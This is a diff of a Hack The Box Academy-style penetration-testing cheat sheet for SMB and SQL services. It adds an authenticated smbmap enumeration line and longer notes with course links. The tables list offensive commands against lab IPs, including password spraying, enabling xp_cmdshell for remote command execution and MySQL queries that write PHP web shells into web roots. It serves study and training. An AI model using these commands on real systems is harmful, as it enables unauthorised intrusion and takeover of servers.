@@ -17,6 +17,7 @@
 | `smbmap -H 10.129.14.128 -r notes` | Recursive network share enumeration using `smbmap`. |
 | `smbmap -H 10.129.14.128 --download "notes\note.txt"` | Download a specific file from the shared folder. |
 | `smbmap -H 10.129.14.128 --upload test.txt "notes\test.txt"` | Upload a specific file to the shared folder. |
+| `smbmap -H 172.16.7.50 -u BR086 -p Welcome1 -d inlanefreight.local` | Using crednetials obtained to authenticate to remote server and enumerate shares & permissions to the shares. [Attacking SMB - ATTACKING COMMON SERVICES](https://academy.hackthebox.com/module/116/section/1167) |
 | `rpcclient -U'%' 10.10.110.17` | Null-session with the `rpcclient`. |
 | `./enum4linux-ng.py 10.10.11.45 -A -C` | Automated enumeratition of the SMB service using `enum4linux-ng`. |
 | `crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!'` | Password spraying against different users from a list. |
@@ -35,7 +36,7 @@
 |-|-|
 | `mysql -u julio -pPassword123 -h 10.129.20.13` | Connecting to the MySQL server. |
 | `sqlcmd -S SRVMSSQL\SQLEXPRESS -U julio -P 'MyPassword!' -y 30 -Y 30` | Connecting to the MSSQL server.  |
-| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux.  |
+| `sqsh -S 10.129.203.7 -U julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux. [Interacting with Common Services - MySQL & MSSQL common ways to interact with the databases remotely through Command Line Utilities: `mysql` or `sqsh`](https://academy.hackthebox.com/module/116/section/1140) |
 | `sqsh -S 10.129.203.7 -U .\\julio -P 'MyPassword!' -h` | Connecting to the MSSQL server from Linux while Windows Authentication mechanism is used by the MSSQL server. |
 | `mysql> SHOW DATABASES;` | Show all available databases in MySQL. |
 | `mysql> USE htbusers;` | Select a specific database in MySQL. |
@@ -48,7 +49,7 @@
 | `sqlcmd> EXECUTE sp_configure 'show advanced options', 1` | To allow advanced options to be changed. |
 | `sqlcmd> EXECUTE sp_configure 'xp_cmdshell', 1` | To enable the xp_cmdshell. |
 | `sqlcmd> RECONFIGURE` | To be used after each sp_configure command to apply the changes. |
-| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server. |
+| `sqlcmd> xp_cmdshell 'whoami'` | Execute a system command from MSSQL server to test if successfully able to perform Remote Command Execution RCE on remote target through SQL syntax. [XP_CMDSHELL - Attacking SQL Databases](https://academy.hackthebox.com/module/116/section/1169) |
 | `mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php'` | Create a file using MySQL. |
 | `mysql> SELECT "<?php echo shell_exec($_GET['cmd']);?>" INTO OUTFILE "C:\\xampp\\htdocs\\z.php"; ` | Write php webshell on a Windows target running XAMPP. |
 | `mysql> show variables like "secure_file_priv";` | Check if the the secure file privileges are empty to read locally stored files on the system. |
